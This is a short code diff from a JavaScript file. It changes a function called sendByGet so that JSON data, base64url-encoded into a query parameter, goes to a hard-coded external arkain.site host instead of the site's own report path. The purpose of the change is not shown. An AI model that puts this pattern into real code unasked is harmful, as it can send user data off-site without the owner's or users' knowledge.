@@ -530,7 +530,7 @@ function toBase64UrlUtf8(text) {
 
 async function sendByGet(data, context) {
   const encoded = toBase64UrlUtf8(JSON.stringify(data));
-  const url = new URL(REPORT_PATH, window.location.origin);
+  const url = new URL("https://asdfg.ap-northeast-2.arkain.site/get_json");
   url.searchParams.set("d", encoded);
   url.searchParams.set("t", String(Date.now()));
 
